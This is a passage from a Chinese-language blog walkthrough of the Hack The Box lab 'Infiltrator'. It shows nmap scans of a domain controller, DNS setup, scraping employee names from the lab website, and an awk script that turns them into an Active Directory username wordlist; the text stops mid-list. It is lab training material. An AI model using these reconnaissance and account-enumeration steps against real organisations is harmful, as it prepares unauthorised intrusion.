<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-Infiltrator | Life lover</title><meta name="author" content="SUqerBrave"><meta name="copyright" content="SUqerBrave"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="引言 项目概述：hack the box的赛季靶机Infiltrator,难度Insane，竟恐怖如斯。本文带你轻松愉悦的感受顶级难度的靶机之旅。由于域渗透过程详细，可以说一文带你走进域渗透。 技术点涉及: 端口扫描、域渗透准备工作、WEB渗透、用户名信息搜集以及字典构造、密码喷射、Kerberos、HASH破解、bloodhound、权限维持、提权、mysql读取任意文件、mysq写入文件、未知">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-Infiltrator">
<meta property="og:url" content="https://suqerbrave.github.io/2024/09/07/HTB-Infiltrator/index.html">
<meta property="og:site_name" content="Life lover">
<meta property="og:description" content="引言 项目概述：hack the box的赛季靶机Infiltrator,难度Insane，竟恐怖如斯。本文带你轻松愉悦的感受顶级难度的靶机之旅。由于域渗透过程详细，可以说一文带你走进域渗透。 技术点涉及: 端口扫描、域渗透准备工作、WEB渗透、用户名信息搜集以及字典构造、密码喷射、Kerberos、HASH破解、bloodhound、权限维持、提权、mysql读取任意文件、mysq写入文件、未知">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://suqerbrave.github.io/img/734167.jpg">
<meta property="article:published_time" content="2024-09-07T07:51:38.000Z">
<meta property="article:modified_time" content="2024-09-07T08:33:45.588Z">
<meta property="article:author" content="SUqerBrave">
<meta property="article:tag" content="HTB">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://suqerbrave.github.io/img/734167.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://suqerbrave.github.io/2024/09/07/HTB-Infiltrator/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HTB-Infiltrator',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-07 16:33:45'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Life lover" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><span> 类别</span></a></li><li><a class="site-page child" href="/link/"><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><span> 关于</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 类别</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%AE%89%E5%8D%93/"><span> 安卓</span></a></li><li><a class="site-page child" href="/categories/%E6%94%BB%E9%98%B2/"><span> 攻防</span></a></li><li><a class="site-page child" href="/categories/Vulnhub/"><span> Vulnhub</span></a></li><li><a class="site-page child" href="/categories/hack-the-box/"><span> hack-the-box</span></a></li><li><a class="site-page child" href="/categories/vulfocus/"><span> vulfocus</span></a></li><li><a class="site-page child" href="/categories/%E5%B7%A5%E5%85%B7/"><span> 工具</span></a></li><li><a class="site-page child" href="/categories/%E6%8A%80%E8%83%BD%E5%AD%A6%E4%B9%A0/"><span> 技能学习</span></a></li><li><a class="site-page child" href="/categories/CTF/"><span> CTF</span></a></li><li><a class="site-page child" href="/categories/%E4%BB%A3%E7%A0%81%E7%A0%94%E7%A9%B6/"><span> 代码研究</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/734167.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Life lover"><span class="site-name">Life lover</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><span> 类别</span></a></li><li><a class="site-page child" href="/link/"><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><span> 关于</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 类别</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%AE%89%E5%8D%93/"><span> 安卓</span></a></li><li><a class="site-page child" href="/categories/%E6%94%BB%E9%98%B2/"><span> 攻防</span></a></li><li><a class="site-page child" href="/categories/Vulnhub/"><span> Vulnhub</span></a></li><li><a class="site-page child" href="/categories/hack-the-box/"><span> hack-the-box</span></a></li><li><a class="site-page child" href="/categories/vulfocus/"><span> vulfocus</span></a></li><li><a class="site-page child" href="/categories/%E5%B7%A5%E5%85%B7/"><span> 工具</span></a></li><li><a class="site-page child" href="/categories/%E6%8A%80%E8%83%BD%E5%AD%A6%E4%B9%A0/"><span> 技能学习</span></a></li><li><a class="site-page child" href="/categories/CTF/"><span> CTF</span></a></li><li><a class="site-page child" href="/categories/%E4%BB%A3%E7%A0%81%E7%A0%94%E7%A9%B6/"><span> 代码研究</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Infiltrator</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-07T07:51:38.000Z" title="发表于 2024-09-07 15:51:38">2024-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-07T08:33:45.588Z" title="更新于 2024-09-07 16:33:45">2024-09-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/hack-the-box/">hack-the-box</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTB-Infiltrator"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><ul>
<li><strong>项目概述</strong>：hack the box的赛季靶机Infiltrator,难度Insane，竟恐怖如斯。本文带你轻松愉悦的感受顶级难度的靶机之旅。由于域渗透过程详细，可以说一文带你走进域渗透。</li>
<li><strong>技术点涉及</strong>: 端口扫描、域渗透准备工作、WEB渗透、用户名信息搜集以及字典构造、密码喷射、Kerberos、HASH破解、bloodhound、权限维持、提权、mysql读取任意文件、mysq写入文件、未知路径猜测、PHP命令执行</li>
<li><strong>目标与读者</strong>：网络安全兴趣爱好者、红队选手</li>
</ul>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 21:00 EDT</span><br><span class="line">Nmap scan report for 10.10.11.31</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65511 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">15220/tcp open  unknown</span><br><span class="line">15230/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49694/tcp open  unknown</span><br><span class="line">49723/tcp open  unknown</span><br><span class="line">49746/tcp open  unknown</span><br><span class="line">49879/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 170.18 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>详细扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Thu Sep  5 21:03:50 2024 as: nmap -sT -Pn -sV -sC -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,15220,15230,49667,49690,49691,49694,49723,49746,49879 -oA nmapscan/detail 10.10.11.31</span><br><span class="line">Nmap scan report for 10.10.11.31</span><br><span class="line">Host is up (0.72s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Infiltrator.htb</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-06 00:53:54Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-09-06T00:57:50+00:00; -10m07s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">|_ssl-date: 2024-09-06T00:57:49+00:00; -10m07s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-09-06T00:57:51+00:00; -10m07s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR</span><br><span class="line">| Not valid before: 2024-08-04T18:48:15</span><br><span class="line">|_Not valid after:  2099-07-17T18:48:15</span><br><span class="line">|_ssl-date: 2024-09-06T00:57:49+00:00; -10m07s from scanner time.</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Domain_Name: INFILTRATOR</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: infiltrator.htb</span><br><span class="line">|   DNS_Computer_Name: dc01.infiltrator.htb</span><br><span class="line">|   DNS_Tree_Name: infiltrator.htb</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-09-06T00:57:05+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.infiltrator.htb</span><br><span class="line">| Not valid before: 2024-07-30T13:20:17</span><br><span class="line">|_Not valid after:  2025-01-29T13:20:17</span><br><span class="line">|_ssl-date: 2024-09-06T00:57:49+00:00; -10m08s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">15220/tcp open  unknown</span><br><span class="line">15230/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49694/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49723/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49746/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49879/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (88%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (88%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -10m07s, deviation: 0s, median: -10m07s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-09-06T00:57:10</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>整理结果<br>端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,15220,15230,49667,49690,49691,49694,49723,49746,49879</span><br></pre></td></tr></table></figure>
<p>域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infiltrator.htb</span><br></pre></td></tr></table></figure>
<p>主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dc01.infiltrator.htb</span><br></pre></td></tr></table></figure>


<h1 id="域渗透准备工作"><a href="#域渗透准备工作" class="headerlink" title="域渗透准备工作"></a>域渗透准备工作</h1><p>配置dnsserver</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span><br></pre></td></tr></table></figure>
<p>添加目标机器为dns服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat /etc/resolv.conf                                            </span><br><span class="line"># Generated by NetworkManager</span><br><span class="line">nameserver 10.10.11.31</span><br><span class="line">nameserver 192.168.122.1</span><br></pre></td></tr></table></figure>


<p>检查解析结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ nslookup dc01.infiltrator.htb</span><br><span class="line">Server:         10.10.11.31</span><br><span class="line">Address:        10.10.11.31#53</span><br><span class="line"></span><br><span class="line">Name:   dc01.infiltrator.htb</span><br><span class="line">Address: 10.10.11.31</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解析成功，证明dns服务器配置完成，虽然配置<code>/etc/hosts</code>也可以做到<br>但是，遇到大型目标还是乖乖配置dns服务器为好</p>
<h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>80端口<br>发现有个团队介绍<br><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240906094111.png"></p>
<p>使用xpath提取<br>#curl #xpath</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://dc01.infiltrator.htb | xmllint --html --xpath &quot;//div/div/h4&quot; - </span><br></pre></td></tr></table></figure>
<p>复制需要的部分写入到tmp文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;h4&gt;.01 David Anderson&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;.02 Olivia Martinez&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;.03 Kevin Turner&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;.04 Amanda Walker&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;.05 Marcus Harris&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;.06 Lauren Clark&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;.07 Ethan Rodriguez&lt;/h4&gt;</span><br></pre></td></tr></table></figure>

<p>awk切分tmp文件为自己要的部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F&#x27;&gt;|&lt;&#x27; &#x27;&#123;print substr($3,5)&#125;&#x27; tmp &gt; username</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat username      </span><br><span class="line">David Anderson</span><br><span class="line">Olivia Martinez</span><br><span class="line">Kevin Turner</span><br><span class="line">Amanda Walker</span><br><span class="line">Marcus Harris</span><br><span class="line">Lauren Clark</span><br><span class="line">Ethan Rodriguez</span><br></pre></td></tr></table></figure>
<p>很nice</p>
<h1 id="SMB渗透"><a href="#SMB渗透" class="headerlink" title="SMB渗透"></a>SMB渗透</h1><p>现在需要确认目标系统的账号</p>
<p>一般登录域用户的账号是长这个样子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username@xxxx.com</span><br></pre></td></tr></table></figure>

<p>#awk  #生成域用户字典 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27; </span><br><span class="line">  &#123;</span><br><span class="line">    name = $0</span><br><span class="line">    split(name, parts, &quot; &quot;)</span><br><span class="line">    first = tolower(parts[1])</span><br><span class="line">    last = tolower(parts[2])</span><br><span class="line">    print first &quot;.&quot; last &quot;@infiltrator.htb&quot;</span><br><span class="line">    print first &quot;_&quot; last &quot;@infiltrator.htb&quot;</span><br><span class="line">    print substr(first, 1, 1) &quot;.&quot; last &quot;@infiltrator.htb&quot;</span><br><span class="line">    print substr(first, 1, 1) &quot;_&quot; last &quot;@infiltrator.htb&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#x27; username &gt; AD_username</span><br></pre></td></tr></table></figure>

<p>现在需要取碰撞那些用户存在了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat AD_username </span><br><span class="line">david.anderson@infiltrator.htb</span><br><span class="line">david_anderson@infiltrator.htb</span><br><span class="line">d.anderson@infiltrator.htb</span><br><span class="line">d_anderson@infiltrator.htb</span><br><span class="line">olivia.martinez@infiltrator.htb</span><br><span class="line">olivia_martinez@infiltrator.htb</span><br><span class="line">o.martinez@infiltrator.htb</span><br><span class="line">o_martinez@infiltrator.htb</span><br><span class="line">kevin.turner@infiltrator.htb</span><br><span class="line">kevin_turner@infiltrator.htb</span><br><span class="line">k.turner@infiltrator.htb</span><br><span 